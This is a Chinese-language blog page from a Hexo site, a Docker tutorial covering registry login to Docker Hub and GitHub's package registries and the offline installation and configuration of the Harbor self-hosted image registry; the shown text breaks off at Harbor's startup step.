



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="qingjiegong" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="qingjiegong" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="qingjiegong" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2022/08/26/docker/">


<meta name="description" content="[TOC] 链接官网：https:&#x2F;&#x2F;www.docker.org 入门文档：Docker 入门教程 - 阮一峰的网络日志 (ruanyifeng.com) docker仓库官网仓库https:&#x2F;&#x2F;hub.docker.org github docker仓库github上也提供了docker镜像仓库服务，分为两类:  docker.pkg.github.com 仓库关联的镜像仓库，必须对应一个仓库">
<meta property="og:type" content="article">
<meta property="og:title" content="qingjiegong">
<meta property="og:url" content="http://example.com/2022/08/26/docker/index.html">
<meta property="og:site_name" content="qingjiegong">
<meta property="og:description" content="[TOC] 链接官网：https:&#x2F;&#x2F;www.docker.org 入门文档：Docker 入门教程 - 阮一峰的网络日志 (ruanyifeng.com) docker仓库官网仓库https:&#x2F;&#x2F;hub.docker.org github docker仓库github上也提供了docker镜像仓库服务，分为两类:  docker.pkg.github.com 仓库关联的镜像仓库，必须对应一个仓库">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/oesdx3mp92.png?imageView2/2/w/1620">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/rngibjvpq3.png?imageView2/2/w/1620">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/zkcftwgree.png?imageView2/2/w/1620">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/sppv6e1v0a.png?imageView2/2/w/1620">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/q2xx5cx33m.png?imageView2/2/w/1620">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/03pjtyjwv4.png?imageView2/2/w/1620">
<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/9cauhey9il.png?imageView2/2/w/1620">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/c5hh5ZpXfqtNEXALlibyHtZI83KmhT3Lw3e8LXo7H3echOYrgdVh4THOhib60nibhmVUibTQVZmQp2Xhibowu5WGo0Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/c5hh5ZpXfqtNEXALlibyHtZI83KmhT3LwD71icMxfB21AicyLRXvZojGk4Ria6RZyhTkMfht25BR5FcdUnnrUf5kaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/c5hh5ZpXfqtNEXALlibyHtZI83KmhT3LwBpW5qptqEWfzraIcQAEz7dibJYZcTUJiaQ50qQuzOibKL2bbDWJttGv5w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="http://127.0.0.1:3000/image-20220508155859695.png">
<meta property="og:image" content="http://127.0.0.1:3000/image-20220508160059030.png">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-64fe3fc49352163fe2675557dd4a3d36_720w.jpg">
<meta property="og:image" content="https://pic2.zhimg.com/80/v2-62838df5aa6b1d8401d0d058f5e23ccd_720w.jpg">
<meta property="og:image" content="https://pic3.zhimg.com/80/v2-a63f10a9806d1c95414909196c923cb2_720w.jpg">
<meta property="og:image" content="http://127.0.0.1:3000/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220508160744.png">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyyshvRoBvJ6QbJZRw9wic7gibylV1cJicxOJVWg0Hg0qFhXyT5ug0Pbn2g/640?wx_fmt=png&random=0.7236724850345728&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyMwucPYZb9ZmW27xZl3IpQicZBrWqCThp7LRphtnib2wsLdFYynHaGyPw/640?wx_fmt=png&random=0.7501449915729308&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyLaNAM4xbaWaBeNHPvGhm6Iu9ZmvgOiaIdOo11Q8PiacAhj15uA2123KA/640?wx_fmt=png&random=0.42899086065774017&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyeQqIcfic8kVBoDHjoEsicYTdibGicicO1BvkHTib1QQV7bAd77VxCDZRKsAQ/640?wx_fmt=png&random=0.8667036553651208&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyxUKZsCZOoXUv7lpBxm9mqId7Iq3icoPjictqTTle4zjxjoD4RxNW7yKQ/640?wx_fmt=png&random=0.2006864959409247&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyzdO3Iy629MrSsiavFlicfFsgmbWQlIAIIaGyIrYw5533BhMbR5kjuHiaQ/640?wx_fmt=png&random=0.7056154241642933&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyKrRuvzhCrdKe6RsUMoIe5Iic9wCNSCtJ1OP6YJgdvCG54XFNkv86ARA/640?wx_fmt=png&random=0.09957022906412849&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy2wofUQHqbcQHwtQOeib2RuDvbCeH7rfhPbUuDpRV6k3ZSOicFibhzs7Vg/640?wx_fmt=png&random=0.317058323396312&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyPoU6XbhmLmERPP6FwKHDkAhb2ibD3pLO1mbibYgSIN0qu2SOIvW9ft3A/640?wx_fmt=png&random=0.37942360753709004&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyCFytG38bLww3MnGCY4ISQ2ITic8Hia0IKtt3tn7TslPF7AyebeBJPtqg/640?wx_fmt=png&random=0.09550435108069477&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyCFytG38bLww3MnGCY4ISQ2ITic8Hia0IKtt3tn7TslPF7AyebeBJPtqg/640?wx_fmt=png&random=0.29831465950283786&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy5Fz6qyDTiaGgDg1qicb3xfu2ouFVIHcG7PibvUJpG8hjcXIibtpzWR2DEg/640?wx_fmt=png&random=0.027020731370377638&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyRldXjpOewRsSTXjGSibAfPcVeI2srVPRzRcWtAWpKeKAsdDuUXmb8Hw/640?wx_fmt=png&random=0.60444221647061&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cyUQbZA4dtxoREHicOaMriceUfIaBMBg103vF8sM6JtoFkrxN5niaibkwEjA/640?wx_fmt=png&random=0.48763975710440555&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy7l2piaPZ1zMmFiahjcwQzHrbOKX3UIOuia2veMS9DtkiaZc0B2344WrgLQ/640?wx_fmt=png&random=0.2645517507663635&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLFvhCbhGzOibqxc75RyoJ6cy1GoXDD0TNOia3KNZeJ97FB5YBibFeFaMSdbY6xfy4RuKP9UPxlatmDdQ/640?wx_fmt=png&random=0.7296276906655683&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcoicqpsp7Xrh0tfVNibAsP3MtPT1leMDrsn5zY3Ls3MGSb11yWESqxm1w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcP6mX5ia6VsWEV4lDPxXR8TKwmmPEBPiasDvJ0KzicpbKY9XdIq8vafuMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcrp5QlUUvgsOULXFaktNXXGYlGG8Ze96odtdp1Nh5dDCmO09dYgC1PA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcST4ehR5axoHrLdV7YsL5iaqibLiaicDRHuNuSJQd8K09gAOOGlxZKpPVng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicMUXRISwKcGJW9nnXK5b2xcRobicwF0bIKqfPoia3HyPibicuUB6VkiciaPUSyjN3ibOxk0dYvepIaxea1XQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201025225944432.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031165431445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="c:/Users/shell">
<meta property="og:image" content="http://tva1.sinaimg.cn/large/006uFBysly1h397f7lv6fj30sf0a2wj9.jpg">
<meta property="og:image" content="http://tva1.sinaimg.cn/large/006uFBysly1h397f7ooc4j30iz03n41a.jpg">
<meta property="og:image" content="http://tva1.sinaimg.cn/large/006uFBysly1h397f7n13nj30gn02tq4r.jpg">
<meta property="og:image" content="http://tva1.sinaimg.cn/large/006uFBysly1h397f7lu4pj30mm09m7cr.jpg">
<meta property="og:image" content="http://tva1.sinaimg.cn/large/006uFBysly1h397f7p106j30gs04ggo6.jpg">
<meta property="og:image" content="http://tva1.sinaimg.cn/large/006uFBysly1h397f7ohjeg30wr0nf100.gif">
<meta property="article:published_time" content="2022-08-26T06:02:26.660Z">
<meta property="article:modified_time" content="2022-08-24T01:25:48.229Z">
<meta property="article:author" content="qingjiegong">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ask.qcloudimg.com/http-save/yehe-5866756/oesdx3mp92.png?imageView2/2/w/1620">


  <title>
 |
Blog = qingjiegong</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-08-26 14:02:26">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-08-26T14:02:26+08:00">2022-08-26</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Blog</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/docker/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="qingjiegong">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="qingjiegong">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>[TOC]</p>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>官网：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG9ja2VyLm9yZy8=">https://www.docker.org</span></p>
<p>入门文档：<span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE4LzAyL2RvY2tlci10dXRvcmlhbC5odG1s">Docker 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</span></p>
<h1 id="docker仓库"><a href="#docker仓库" class="headerlink" title="docker仓库"></a>docker仓库</h1><h2 id="官网仓库"><a href="#官网仓库" class="headerlink" title="官网仓库"></a>官网仓库</h2><p><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLm9yZy8=">https://hub.docker.org</span></p>
<h2 id="github-docker仓库"><a href="#github-docker仓库" class="headerlink" title="github docker仓库"></a>github docker仓库</h2><p>github上也提供了docker镜像仓库服务，分为两类:</p>
<ul>
<li><code>docker.pkg.github.com</code> 仓库关联的镜像仓库，必须对应一个仓库</li>
<li><code>ghcr.io</code> 仓库无关的镜像仓库，和用户关联</li>
</ul>
<p>tag格式分别为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:VERSION </span><br><span class="line">ghcr.io/OWNER/IMAGE_NAME:VERSION </span><br></pre></td></tr></table></figure>

<p>登入的密码就是github上创建的<code>TOKEN</code>，注意token必须有读写package的相关权限，我把token记录在了环境变量中，也可以记录在指定的文件里，将echo替换为cat即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $GITHUB_DOCKER_IMAGE_TOKEN | docker login https://docker.pkg.github.com -u biningo --password-stdin </span><br><span class="line">echo $GITHUB_DOCKER_IMAGE_TOKEN | docker login https://ghcr.io -u biningo --password-stdin </span><br></pre></td></tr></table></figure>

<h2 id="harbor自建个人镜像仓库"><a href="#harbor自建个人镜像仓库" class="headerlink" title="harbor自建个人镜像仓库"></a>harbor自建个人镜像仓库</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Harbor是一款开源的Docker镜像仓库服务，在Github上目前有13.4k+Star。提供了基于角色的镜像访问机制，可以保护你的镜像安全。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><blockquote>
<p>学习开源项目的第一步，一般都是把它运行起来，我们先来把Harbor运行起来吧！</p>
</blockquote>
<ul>
<li>下载Harbor安装包，这里下载的是离线版本，下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvaGFyYm9yL2hhcmJvci9yZWxlYXNlcyU2MHYxLjEwLjYlNjA=">https://github.com/goharbor/harbor/releases`v1.10.6`</span></li>
</ul>
<p><img data-src="https://ask.qcloudimg.com/http-save/yehe-5866756/oesdx3mp92.png?imageView2/2/w/1620" alt="img"></p>
<ul>
<li>下载完成后上传到Linux服务器，使用如下命令解压;</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvf harbor-offline-installer-v1<span class="number">.10</span><span class="number">.6</span>.<span class="property">tgz</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解压完成后，所有文件内容如下；</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-local harbor]# ll</span><br><span class="line">total <span class="number">700260</span></span><br><span class="line">drwxr-xr-x. <span class="number">3</span> root root        <span class="number">20</span> <span class="title class_">Dec</span>  <span class="number">2</span> <span class="number">11</span>:<span class="number">18</span> common</span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root      <span class="number">3398</span> <span class="title class_">Nov</span> <span class="number">17</span> <span class="number">11</span>:<span class="number">58</span> common.<span class="property">sh</span></span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root      <span class="number">5348</span> <span class="title class_">Dec</span>  <span class="number">2</span> <span class="number">14</span>:<span class="number">41</span> docker-compose.<span class="property">yml</span></span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root <span class="number">717021676</span> <span class="title class_">Nov</span> <span class="number">17</span> <span class="number">11</span>:<span class="number">59</span> harbor.<span class="property">v1</span><span class="number">.10</span><span class="number">.6</span>.<span class="property">tar</span>.<span class="property">gz</span></span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root      <span class="number">5882</span> <span class="title class_">Dec</span>  <span class="number">2</span> <span class="number">11</span>:<span class="number">21</span> harbor.<span class="property">yml</span></span><br><span class="line">-rwxr-xr-x. <span class="number">1</span> root root      <span class="number">2284</span> <span class="title class_">Nov</span> <span class="number">17</span> <span class="number">11</span>:<span class="number">58</span> install.<span class="property">sh</span></span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root     <span class="number">11347</span> <span class="title class_">Nov</span> <span class="number">17</span> <span class="number">11</span>:<span class="number">58</span> <span class="variable constant_">LICENSE</span></span><br><span class="line">-rwxr-xr-x. <span class="number">1</span> root root      <span class="number">1749</span> <span class="title class_">Nov</span> <span class="number">17</span> <span class="number">11</span>:<span class="number">58</span> prepare</span><br></pre></td></tr></table></figure>

<ul>
<li>修改Harbor的配置文件，修改，并注释掉配置，相关属性说明参考注释即可;<code>harbor.yml``hostname``https</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"># 指定<span class="title class_">Harbor</span>的管理界面及镜像仓库访问地址</span><br><span class="line"><span class="attr">hostname</span>: <span class="number">192.168</span><span class="number">.3</span><span class="number">.101</span></span><br><span class="line"></span><br><span class="line"># http相关配置</span><br><span class="line"><span class="attr">http</span>:</span><br><span class="line">  # http端口，如果配置了https，默认使用https</span><br><span class="line">  <span class="attr">port</span>: <span class="number">80</span></span><br><span class="line"></span><br><span class="line"># https相关配置</span><br><span class="line">#<span class="attr">https</span>:</span><br><span class="line">#  # https端口</span><br><span class="line">#  <span class="attr">port</span>: <span class="number">443</span></span><br><span class="line">#  # 指定<span class="title class_">Habor</span>中<span class="title class_">Nginx</span>的https的证书和私钥地址</span><br><span class="line">#  <span class="attr">certificate</span>: <span class="regexp">/your/</span>certificate/path</span><br><span class="line">#  <span class="attr">private_key</span>: <span class="regexp">/your/</span>private/key/path</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Harbor</span>默认管理员账号admin的密码</span><br><span class="line"><span class="attr">harbor_admin_password</span>: <span class="title class_">Harbor12345</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Harbor</span>内置<span class="title class_">PostgreSQL</span>数据库配置</span><br><span class="line"><span class="attr">database</span>:</span><br><span class="line">  # root用户密码</span><br><span class="line">  <span class="attr">password</span>: root123</span><br><span class="line">  # 最大空闲连接数，小于等于<span class="number">0</span>表示无空闲连接</span><br><span class="line">  <span class="attr">max_idle_conns</span>: <span class="number">50</span></span><br><span class="line">  # 最大连接数，小于等于<span class="number">0</span>表示无限制</span><br><span class="line">  <span class="attr">max_open_conns</span>: <span class="number">100</span></span><br><span class="line"></span><br><span class="line"># 默认数据目录</span><br><span class="line"><span class="attr">data_volume</span>: /data</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Clair</span> configuration</span><br><span class="line"><span class="attr">clair</span>:</span><br><span class="line">  # <span class="title class_">The</span> interval <span class="keyword">of</span> clair updaters, the unit is hour, set to <span class="number">0</span> to disable the updaters.</span><br><span class="line">  <span class="attr">updaters_interval</span>: <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobservice</span>:</span><br><span class="line">  # <span class="title class_">Maximum</span> number <span class="keyword">of</span> job workers <span class="keyword">in</span> job service</span><br><span class="line">  <span class="attr">max_job_workers</span>: <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">notification</span>:</span><br><span class="line">  # <span class="title class_">Maximum</span> retry count <span class="keyword">for</span> webhook job</span><br><span class="line">  <span class="attr">webhook_job_max_retry</span>: <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">chart</span>:</span><br><span class="line">  # <span class="title class_">Change</span> the value <span class="keyword">of</span> absolute_url to enabled can enable absolute url <span class="keyword">in</span> chart</span><br><span class="line">  <span class="attr">absolute_url</span>: disabled</span><br><span class="line"></span><br><span class="line"># 日志配置</span><br><span class="line"><span class="attr">log</span>:</span><br><span class="line">  # 日志级别配置：debug, info, warning, error, fatal</span><br><span class="line">  <span class="attr">level</span>: info</span><br><span class="line">  # 日志本地存储策略</span><br><span class="line">  <span class="attr">local</span>:</span><br><span class="line">    # 日志文件滚动数量，超过该数量会删除日志文件</span><br><span class="line">    <span class="attr">rotate_count</span>: <span class="number">50</span></span><br><span class="line">    # 日志滚动大小，超过该大小会生成新的日志文件</span><br><span class="line">    <span class="attr">rotate_size</span>: 200M</span><br><span class="line">    # 日志存储路径</span><br><span class="line">    <span class="attr">location</span>: <span class="regexp">/var/</span>log/harbor</span><br><span class="line"></span><br><span class="line"># <span class="title class_">This</span> attribute is <span class="keyword">for</span> migrator to detect the version <span class="keyword">of</span> the .<span class="property">cfg</span> file, <span class="variable constant_">DO</span> <span class="variable constant_">NOT</span> <span class="variable constant_">MODIFY</span>!</span><br><span class="line"><span class="attr">_version</span>: <span class="number">1.10</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Configure</span> proxies to be used by <span class="title class_">Clair</span>, the replication jobservice, and <span class="title class_">Harbor</span>. <span class="title class_">Leave</span> blank <span class="keyword">if</span> no proxies are required.</span><br><span class="line"><span class="attr">proxy</span>:</span><br><span class="line">  <span class="attr">http_proxy</span>:</span><br><span class="line">  <span class="attr">https_proxy</span>:</span><br><span class="line">  # no_proxy endpoints will appended to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>,localhost,.<span class="property">local</span>,.<span class="property">internal</span>,log,db,redis,nginx,core,portal,postgresql,jobservice,registry,registryctl,clair,chartmuseum,notary-server</span><br><span class="line">  <span class="attr">no_proxy</span>:</span><br><span class="line">  <span class="attr">components</span>:</span><br><span class="line">    - core</span><br><span class="line">    - jobservice</span><br><span class="line">    - clair</span><br></pre></td></tr></table></figure>

<ul>
<li>使用脚本安装Harbor：<code>install.sh</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./install.<span class="property">sh</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Harbor启动成功后会输出如下信息，这里需要注意的是Harbor会启动Nginx、<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9wcm9kdWN0L2Nycz9mcm9tPTEwNjgw">Redis</span>之类的容器，以前创建过的需要先删除掉，看到就表示启动成功了;<code>started successfully</code></li>
</ul>
